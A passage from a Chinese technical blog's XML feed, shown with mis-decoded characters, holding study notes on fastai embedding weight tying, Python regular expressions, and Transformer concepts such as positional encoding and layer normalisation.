“è¿</h3><p>é¢„æµ‹çš„ä¸‹ä¸€ä¸ªå•è¯ä¸å°†æ¿€æ´»å€¼è½¬å˜ä¸ºè‹±è¯­å•è¯æœ‰å…³ã€‚embeddingå®ç°äº†å•è¯åˆ°æ¿€æ´»å€¼çš„è½¬å˜ï¼Œä¸€ä¸ªåˆç†çš„å‡è®¾å°±æ˜¯è¿™äº›éƒ½æ˜¯åŸºæœ¬ç›¸åŒçš„è¿ç®—ï¼Œæˆ–è€…è‡³å°‘è¯´æ˜¯é¡ºåºç›¸åçš„ï¼Œæ‰€ä»¥ä¸ºä»€ä¹ˆä¸ä½¿ç”¨ç›¸åŒçš„æƒé‡å‘¢ã€‚å®é™…ä¸Šç¡®å®å¯ä»¥è¿™æ ·ï¼Œè€Œä¸”æ•ˆæœå¾ˆå¥½ã€‚<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/374.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/375.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/376.png"><br>Now this is far better than our previous model!</p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonæ­£åˆ™è¡¨è¾¾å¼å…¥é—¨</title>
      <link href="/2021/07/27/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/"/>
      <url>/2021/07/27/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h1><h2 id="å¼•å…¥æ¨¡å—"><a href="#å¼•å…¥æ¨¡å—" class="headerlink" title="å¼•å…¥æ¨¡å—"></a>å¼•å…¥æ¨¡å—</h2><p>import re</p><h2 id="ç¼–è¯‘æ­£åˆ™è¡¨è¾¾å¼"><a href="#ç¼–è¯‘æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="ç¼–è¯‘æ­£åˆ™è¡¨è¾¾å¼"></a>ç¼–è¯‘æ­£åˆ™è¡¨è¾¾å¼</h2><p>m=re.compile(râ€™\d+â€™)</p><h2 id="ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼"><a href="#ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼"></a>ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼</h2><h3 id="matchï¼ˆï¼‰"><a href="#matchï¼ˆï¼‰" class="headerlink" title="matchï¼ˆï¼‰"></a>matchï¼ˆï¼‰</h3><p>q=m.match(â€˜1833â€™)<br>q.span()<br>Out[42]: (0, 4)</p><h3 id="searchï¼ˆï¼‰"><a href="#searchï¼ˆï¼‰" class="headerlink" title="searchï¼ˆï¼‰"></a>searchï¼ˆï¼‰</h3><p>q=m.search(â€˜..1833â€™)<br>q.span()<br>Out[44]: (2, 6)</p><h1 id="ç¼–è¯‘æ ‡å¿—"><a href="#ç¼–è¯‘æ ‡å¿—" class="headerlink" title="ç¼–è¯‘æ ‡å¿—"></a>ç¼–è¯‘æ ‡å¿—</h1><p><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/0.png"><br>re.S  :è®©.å¯ä»¥åŒ¹é…\n<br>re.I   :å¯¹å¤§å°å†™ä¸æ•æ„Ÿ<br>re.M  :å¤šè¡ŒåŒ¹é…ï¼Œå¯ä»¥æŸ¥æ‰¾æ¯ä¸€è¡Œçš„å¼€å¤´ç»“å°¾<br>re.X  :å½“æ­£åˆ™è¡¨è¾¾å¼æ˜¯å¤šè¡Œçš„æ—¶å€™ï¼Œå¿½ç•¥å…¶ä¸­çš„\n<br>â€‹</p><h1 id="åˆ†ç»„"><a href="#åˆ†ç»„" class="headerlink" title="åˆ†ç»„"></a>åˆ†ç»„</h1><p>éœ€è¦æ³¨æ„çš„æ˜¯åˆ†ç»„çš„findallï¼ˆï¼‰ä¼šä¼˜å…ˆåŒ¹é…åˆ†ç»„å†…çš„å†…å®¹ï¼Œå¦‚<br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/1.png"><br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/2.png"><br>ç”¨æ³•ï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/3.png"><br>éœ€è¦åŒ¹é…ç»¿æ¡†çš„å½¢å¼ï¼Œä½†æ˜¯åªæƒ³è¦src=åé¢çš„æ•°æ®<br>è¿™æ—¶å°±è¦ç”¨åˆ†ç»„<br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/4.png"><br>( )ï¼ˆï¼Ÿï¼šï¼‰å’Œï¼ˆï¼Ÿ=ï¼‰çš„åŒºåˆ«<br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/5.png"><br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/6.png"><br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/7.png"></p><p><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/8.png"><br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/9.png"><br>è¡¥å……ï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/10.png"></p><h2 id="å–åˆ†ç»„"><a href="#å–åˆ†ç»„" class="headerlink" title="å–åˆ†ç»„"></a>å–åˆ†ç»„</h2><p>æ¯ä¸ªåˆ†ç»„éƒ½å…¨æ›¿æ¢ï¼Œå¹¶ä¸”æ˜¯æœ€é•¿æ›¿æ¢ï¼ˆè¶…å‡ºåˆ†ç»„èŒƒå›´çš„è´ªå©ªçš„æ›¿æ¢ï¼‰<br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/11.png"><br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/12.png"><br>åªå¯¹ç¬¬ä¸€ä¸ªåˆ†ç»„ç”¨å…¨æ›¿æ¢,ç¬¬äºŒä¸ªåˆ†ç»„éƒ¨åˆ†æ›¿æ¢<br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/13.png"><br>åŒç†åªå¯¹ç¬¬äºŒä¸ªåˆ†ç»„ç”¨å…¨æ›¿æ¢,ç¬¬ä¸€ä¸ªåˆ†ç»„éƒ¨åˆ†æ›¿æ¢<br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/14.png"></p><h3 id="å¦å¤–æ³¨æ„"><a href="#å¦å¤–æ³¨æ„" class="headerlink" title="å¦å¤–æ³¨æ„"></a>å¦å¤–æ³¨æ„</h3><p>åŒ¹é…å®Œfoobä¹‹åå°±åªå‰©ä¸‹aräº†<br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/15.png"><br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/16.png"></p><h2 id="å¯¹åˆ†ç»„å‘½å"><a href="#å¯¹åˆ†ç»„å‘½å" class="headerlink" title="å¯¹åˆ†ç»„å‘½å"></a>å¯¹åˆ†ç»„å‘½å</h2><p><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/17.png"><br>æˆ–<br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/18.png"></p><h1 id="è¦æ±‚æŸä¸ªå­—ç¬¦ä¸²ä¸­ä¸èƒ½å‡ºç°æŸä¸ªstr"><a href="#è¦æ±‚æŸä¸ªå­—ç¬¦ä¸²ä¸­ä¸èƒ½å‡ºç°æŸä¸ªstr" class="headerlink" title="è¦æ±‚æŸä¸ªå­—ç¬¦ä¸²ä¸­ä¸èƒ½å‡ºç°æŸä¸ªstr"></a>è¦æ±‚æŸä¸ªå­—ç¬¦ä¸²ä¸­ä¸èƒ½å‡ºç°æŸä¸ªstr</h1><p>^((?!str).)*$<br>æ—¢æœ‰^åˆæœ‰$è¡¨ç¤ºæ¯ä¸ªç©ºå­—ç¬¦çš„ä½ç½®å¼€å§‹çš„æ£€æµ‹éƒ½è¦æ»¡è¶³è¯¥æ­£åˆ™è¡¨è¾¾å¼<br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/19.png"></p><h1 id="ç»“åˆlambadaè¡¨è¾¾å¼ä½¿ç”¨"><a href="#ç»“åˆlambadaè¡¨è¾¾å¼ä½¿ç”¨" class="headerlink" title="ç»“åˆlambadaè¡¨è¾¾å¼ä½¿ç”¨"></a>ç»“åˆlambadaè¡¨è¾¾å¼ä½¿ç”¨</h1><p><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/20.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;<span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">ret, key, value</span>):</span></span><br><span class="line">    ret[key] = value</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">&gt;&gt;string = <span class="string">&#x27;apple pear banana meat&#x27;</span></span><br><span class="line">&gt;&gt;ret = &#123;&#125;</span><br><span class="line">&gt;&gt;re.sub(<span class="string">r&#x27;(apple|banana)\s(\w+)\s?&#x27;</span>, <span class="keyword">lambda</span> x: func(ret, x.group(<span class="number">1</span>), x.group(<span class="number">2</span>)), string)       </span><br><span class="line">&gt;&gt;ret</span><br><span class="line">Out[<span class="number">35</span>]: &#123;<span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;pear&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>: <span class="string">&#x27;meat&#x27;</span>&#125;</span><br><span class="line"><span class="comment">#é¦–å…ˆç”¨æ­£åˆ™è¡¨è¾¾å¼å»åŒ¹é…stringï¼ŒæŠŠè¿”å›çš„ç»“æœä¼ ç»™lambadaè¡¨è¾¾å¼å¤„ç†</span></span><br></pre></td></tr></table></figure><h2 id="å…³äºå…¶ä¸­çš„groupï¼ˆï¼‰"><a href="#å…³äºå…¶ä¸­çš„groupï¼ˆï¼‰" class="headerlink" title="å…³äºå…¶ä¸­çš„groupï¼ˆï¼‰"></a>å…³äºå…¶ä¸­çš„groupï¼ˆï¼‰</h2><p><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/21.png"><br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/22.png"><br>å¯ä»¥çœ‹åˆ°groupï¼ˆ0ï¼‰å’Œgroupï¼ˆ1ï¼‰éƒ½æ˜¯å­—ç¬¦ä¸²å…ƒç»„<br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/23.png"><br>groupï¼ˆ1ï¼‰å–å‡ºäº†æŒ‰ç©ºæ ¼åˆ’åˆ†çš„ç¬¬ä¸€åˆ—ï¼ˆè‡ªåŠ¨å»æ‰äº†ç©ºæ ¼ï¼‰<br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/24.png"><br><img src="https://snowgo.top/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/25.png"></p>]]></content>
      
      
      <categories>
          
          <category> TOOLS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºTransformerçš„ç†è§£</title>
      <link href="/2021/07/27/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/"/>
      <url>/2021/07/27/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="æ€»çš„ç»“æ„"><a href="#æ€»çš„ç»“æ„" class="headerlink" title="æ€»çš„ç»“æ„"></a>æ€»çš„ç»“æ„</h1><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/0.png"><br>å…¶ä¸­æ¯ä¸ªEncoderçš„ç»“æ„éƒ½æ˜¯å®Œå…¨ç›¸åŒçš„ä½†æ˜¯å‚æ•°ä¸åŒ<br>å…·ä½“ä¸€ç‚¹çš„å›¾æ˜¯è¿™æ ·çš„ï¼š<br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/1.png"></p><h1 id="Encoder"><a href="#Encoder" class="headerlink" title="Encoder"></a>Encoder</h1><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/2.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/3.png"></p><h2 id="ä»€ä¹ˆæ˜¯Embedding"><a href="#ä»€ä¹ˆæ˜¯Embedding" class="headerlink" title="ä»€ä¹ˆæ˜¯Embedding"></a>ä»€ä¹ˆæ˜¯Embedding</h2><blockquote><p>åœ°å›¾å°±æ˜¯å¯¹äºç°å®åœ°ç†çš„embeddingï¼Œç°å®çš„åœ°ç†åœ°å½¢çš„ä¿¡æ¯å…¶å®è¿œè¿œè¶…è¿‡ä¸‰ç»´ ä½†æ˜¯åœ°å›¾é€šè¿‡é¢œè‰²å’Œç­‰é«˜çº¿ç­‰æ¥æœ€å¤§åŒ–è¡¨ç°ç°å®çš„åœ°ç†ä¿¡æ¯ã€‚<br>è¯çš„embeddingä¹Ÿå°±æ˜¯ç”¨å›ºå®šçš„ç»´åº¦æ¥æœ€å¤§åŒ–è¡¨ç°è¯çš„ä¿¡æ¯</p></blockquote><h3 id="One-hot-represention"><a href="#One-hot-represention" class="headerlink" title="One hot represention"></a>One hot represention</h3><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/4.png" alt="3 å°ç§ä¿¡  12 æ¡æ¶ˆæ¯ ä»€ä¹ˆæ˜¯ word embedding - çŸ¥ä¹.png"></p><h3 id="Distributed-representation"><a href="#Distributed-representation" class="headerlink" title="Distributed representation"></a>Distributed representation</h3><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/5.png" alt="3 å°ç§ä¿¡  12 æ¡æ¶ˆæ¯ ä»€ä¹ˆæ˜¯ word embedding - çŸ¥ä¹.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/6.png" alt="3 å°ç§ä¿¡  12 æ¡æ¶ˆæ¯ ä»€ä¹ˆæ˜¯ word embedding - çŸ¥ä¹.png"><br>Word embeddingä¹Ÿå°±æ˜¯è¦è¾¾åˆ°ç¬¬äºŒä¸ªç¥ç»ç½‘ç»œæ‰€è¡¨ç¤ºçš„ç»“æœï¼Œé™ä½è®­ç»ƒæ‰€éœ€è¦çš„æ•°æ®é‡ã€‚ è€Œä¸Šé¢çš„å››ä¸ªå•è¯å¯ä»¥è¢«æ‹†æˆ2ä¸ªèŠ‚ç‚¹çš„æ˜¯ç”±æˆ‘ä»¬äººå·¥æä¾›çš„å…ˆéªŒçŸ¥è¯†å°†åŸå§‹çš„è¾“å…¥ç©ºé—´ç»è¿‡f(ä¸Š å›¾ä¸­çš„é»„è‰²ç®­å¤´)æŠ•å°„åˆ°äº†å¦ä¸€ä¸ªç©ºé—´(ç»´åº¦æ›´å°)ï¼Œæ‰€ä»¥æ‰èƒ½å¤Ÿé™ä½è®­ç»ƒæ‰€éœ€è¦çš„æ•°æ®é‡ã€‚ä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰åŠæ³•ä¸€ç›´äººå·¥æä¾›ï¼Œæœºå™¨å­¦ä¹ çš„å®—æ—¨å°±æ˜¯è®©æœºå™¨ä»£æ›¿äººåŠ›å»å‘ç°pattern.</p><blockquote><p>Word embeddingå°±æ˜¯è¦ä»æ•°æ®ä¸­è‡ªåŠ¨å­¦ä¹ åˆ°è¾“å…¥ç©ºé—´åˆ°Distributed representationç©ºé—´çš„æ˜ å°„ fã€‚</p></blockquote><h3 id="å®ä¾‹-é‚£è¿™ä¸¤ä¸ªå•è¯éƒ½ç‹—çš„å“ç§åï¼Œè€Œä¸Šä¸‹æ–‡çš„å†…å®¹å·²ç»æš—æŒ‡äº†è¯¥å•è¯å…·æœ‰å¯çˆ±ï¼Œä¼šèˆ”äººçš„ç‰¹ç‚¹ã€‚"><a href="#å®ä¾‹-é‚£è¿™ä¸¤ä¸ªå•è¯éƒ½ç‹—çš„å“ç§åï¼Œè€Œä¸Šä¸‹æ–‡çš„å†…å®¹å·²ç»æš—æŒ‡äº†è¯¥å•è¯å…·æœ‰å¯çˆ±ï¼Œä¼šèˆ”äººçš„ç‰¹ç‚¹ã€‚" class="headerlink" title="å®ä¾‹:é‚£è¿™ä¸¤ä¸ªå•è¯éƒ½ç‹—çš„å“ç§åï¼Œè€Œä¸Šä¸‹æ–‡çš„å†…å®¹å·²ç»æš—æŒ‡äº†è¯¥å•è¯å…·æœ‰å¯çˆ±ï¼Œä¼šèˆ”äººçš„ç‰¹ç‚¹ã€‚"></a>å®ä¾‹:é‚£è¿™ä¸¤ä¸ªå•è¯éƒ½ç‹—çš„å“ç§åï¼Œè€Œä¸Šä¸‹æ–‡çš„å†…å®¹å·²ç»æš—æŒ‡äº†è¯¥å•è¯å…·æœ‰å¯çˆ±ï¼Œä¼šèˆ”äººçš„ç‰¹ç‚¹ã€‚</h3><ul><li>è¿™ä¸ªå¯çˆ±çš„æ³°è¿ªèˆ”äº†æˆ‘çš„è„¸ã€‚ </li><li>è¿™ä¸ªå¯çˆ±çš„ äº¬å·´èˆ”äº†æˆ‘çš„è„¸ã€‚ </li></ul><p>è€Œä»ä¸Šé¢è¿™ä¸ªä¾‹å­ä¸­æˆ‘ä»¬å°±å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªk:x-&gt;z:é¢„æµ‹ä¸Šä¸‹æ–‡ã€‚ ç”¨è¾“å…¥å•è¯:ä½œä¸ºä¸­å¿ƒå•è¯å»é¢„æµ‹å…¶ä»–å•è¯åå‡ºç°åœ¨å…¶å‘¨è¾¹çš„å¯èƒ½æ€§ã€‚ æˆ‘ä»¬æ—¢çŸ¥é“å¯¹åº”çš„zã€‚è€Œè¯¥ä»»åŠ¡k åˆå¯ä»¥è®© f()æ‰€è½¬æ¢å¾—åˆ°çš„yçš„è¡¨è¾¾å…·æœ‰Distributed representationä¸­æ‰€æ¼”ç¤ºçš„ç‰¹ç‚¹ã€‚å› ä¸ºæˆ‘ä»¬è®©ç›¸ä¼¼çš„å•è¯(å¦‚æ³°è¿ªå’Œé‡‘å·´)å¾—åˆ°ç›¸åŒçš„è¾“å‡º(ä¸Šä¸‹æ–‡)ï¼Œé‚£ä¹ˆç¥ç»ç½‘ç»œå°±ä¼šå°†æ³°è¿ªçš„è¾“å…¥3å’Œé‡‘å·´çš„è¾“å…¥3ç»è¿‡ç¥ç»ç½‘ç»œf(1)å¾—åˆ°å‡ ä¹ç›¸åŒçš„å’Œ æ³°è¿ªçš„è¾“å‡ºyå’Œé‡‘å·´çš„è¾“å‡ºyã€‚(æˆ‘çš„ç†è§£å°±æ˜¯æŠŠæ³°è¿ªå’Œäº¬å·´æ”¾è¿›äº†åŒä¸€ä¸ªä¸Šä¸‹æ–‡ç©ºé—´)</p><h2 id="ä½ç½®ç¼–ç "><a href="#ä½ç½®ç¼–ç " class="headerlink" title="ä½ç½®ç¼–ç "></a>ä½ç½®ç¼–ç </h2><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/7.png"></p><h3 id="RNNæ¢¯åº¦æ¶ˆå¤±çš„åŸå› "><a href="#RNNæ¢¯åº¦æ¶ˆå¤±çš„åŸå› " class="headerlink" title="RNNæ¢¯åº¦æ¶ˆå¤±çš„åŸå› "></a>RNNæ¢¯åº¦æ¶ˆå¤±çš„åŸå› </h3><p>æ˜¯ä¸€ä¸ªæ€»çš„æ¢¯åº¦å’Œï¼Œä»–çš„æ¢¯åº¦æ¶ˆå¤±å¹¶ä¸æ˜¯å˜ä¸º0.è€Œæ˜¯è¯´æ€»æ¢¯åº¦è¢«è¿‘è·ç¦»æ¢¯åº¦ä¸»å¯¼ï¼Œè¿œè·ç¦»æ¢¯åº¦å¿½ç•¥ä¸è®¡</p><h3 id="ä¸ºä»€ä¹ˆéœ€è¦ä½ç½®ç¼–ç ï¼šTransformerå¹¶è¡ŒåŒ–å¤„ç†"><a href="#ä¸ºä»€ä¹ˆéœ€è¦ä½ç½®ç¼–ç ï¼šTransformerå¹¶è¡ŒåŒ–å¤„ç†" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦ä½ç½®ç¼–ç ï¼šTransformerå¹¶è¡ŒåŒ–å¤„ç†"></a>ä¸ºä»€ä¹ˆéœ€è¦ä½ç½®ç¼–ç ï¼šTransformerå¹¶è¡ŒåŒ–å¤„ç†</h3><p>åŠ å¿«äº†å¤„ç†é€Ÿåº¦ï¼Œä½†æ˜¯å¿½ç•¥äº†å•è¯ä¹‹é—´çš„åºåˆ—å…³ç³»ï¼Œæ‰€ä»¥éœ€è¦ä½ç½®ç¼–ç </p><h3 id="æ€ä¹ˆç¼–ç "><a href="#æ€ä¹ˆç¼–ç " class="headerlink" title="æ€ä¹ˆç¼–ç "></a>æ€ä¹ˆç¼–ç </h3><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/8.png"></p><blockquote><p>å¥‡æ•°ä½ç½®ä½¿ç”¨sinæ¥ç¼–ç ï¼Œå¶æ•°ä½ç½®ä½¿ç”¨cosæ¥ç¼–ç </p></blockquote><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/9.png"><br>ç›¸åŠ å¾—åˆ°transformerçš„è¾“å…¥</p><h2 id="æ³¨æ„åŠ›æœºåˆ¶"><a href="#æ³¨æ„åŠ›æœºåˆ¶" class="headerlink" title="æ³¨æ„åŠ›æœºåˆ¶"></a>æ³¨æ„åŠ›æœºåˆ¶</h2><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/10.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/11.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/12.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/13.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/14.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/15.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/16.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/17.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/18.png"></p><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/19.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/20.png"><br>ä½¿å¾—æ¢¯åº¦ä¸æ˜“æ¶ˆå¤±</p><h2 id="Batch-Normal"><a href="#Batch-Normal" class="headerlink" title="Batch Normal"></a>Batch Normal</h2><p>nlpä¸­BNä¸å¤§å¥½ä½¿<br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/21.png"></p><blockquote><p>BNæ˜¯å¯¹batchä¸­æ‰€æœ‰æ ·æœ¬çš„æ¯ä¸€è¡Œï¼ˆå³æŸä¸ªå±æ€§ï¼‰åšå½’ä¸€åŒ–</p></blockquote><p>BNä¼˜ç‚¹<br>ç¬¬ä¸€ä¸ªå°±æ˜¯å¯ä»¥è§£å†³å†…éƒ¨åå˜é‡åç§» ï¼ˆï¼Ÿï¼‰<br>ç¬¬äºŒä¸ªä¼˜ç‚¹å°±æ˜¯ç¼“è§£äº†æ¢¯åº¦é¥±å’Œé—®é¢˜ï¼ˆå¦‚æœä½¿ç”¨sigmoidæ¿€æ´»å‡½æ•°çš„è¯)ï¼ŒåŠ å¿«æ”¶ æ•›ã€‚<br>BNçš„ç¼ºç‚¹<br>ç¬¬ä¸€ä¸ªï¼Œ batch_sizeè¾ƒå°çš„æ—¶å€™ï¼Œæ•ˆæœå·®ã€‚ï¼šå› ä¸ºBNæ˜¯ç”¨ä¸€ä¸ªbatchçš„æ ·æœ¬çš„å‡å€¼æ–¹å·®å»æ¨¡æ‹Ÿæ€»ä½“ï¼Œæ ·æœ¬å°‘äº†å°±æ¨¡æ‹Ÿçš„ä¸å¥½<br>ç¬¬äºŒä¸ªç¼ºç‚¹å°±æ˜¯BNåœ¨RNNä¸­æ•ˆæœæ¯”è¾ƒå·®ã€‚è¿™ä¸€ç‚¹å’Œç¬¬ä¸€ç‚¹åŸå› å¾ˆç±»ä¼¼ï¼Œä¸è¿‡æˆ‘å•æŒ‘å‡ºæ¥è¯´ã€‚<br>RNNçš„è¾“å…¥æ˜¯åŠ¨æ€çš„ï¼š<br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/22.png"><br>æœ‰10æ¡å¥å­ï¼Œå‰9æ¡æœ‰5ä¸ªå•è¯ï¼Œç¬¬10æ¡æœ‰20ä¸ªå•è¯<br>é‚£ä¹ˆå‰5ä¸ªå•è¯çš„å‡å€¼æ–¹å·®å¯ä»¥ç®—å‡ºæ¥ï¼Œç¬¬10æ¡åé¢çš„å•è¯å°±æˆå°batchäº†</p><h2 id="ä¸ºä»€ä¹ˆä½¿ç”¨layer-norm"><a href="#ä¸ºä»€ä¹ˆä½¿ç”¨layer-norm" class="headerlink" title="ä¸ºä»€ä¹ˆä½¿ç”¨layer-norm"></a>ä¸ºä»€ä¹ˆä½¿ç”¨layer-norm</h2><p>ç†è§£:ä¸ºä»€ä¹ˆLayerNormå•ç‹¬å¯¹ä¸€ä¸ªæ ·æœ¬çš„æ‰€æœ‰å•è¯åšç¼©æ”¾å¯ä»¥èµ·åˆ°æ•ˆæœã€‚<br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/23.png"></p><blockquote><p>ä¸ªäººç†è§£ï¼šæ¯ä¸€å¥è¯ä¸­çš„æ‰€æœ‰å­—éƒ½æ˜¯åœ¨åŒä¸€ä¸ªè¯­ä¹‰ä¿¡æ¯é‡Œçš„ï¼Œæ‰€ä»¥å¯ä»¥LN</p></blockquote><p><img 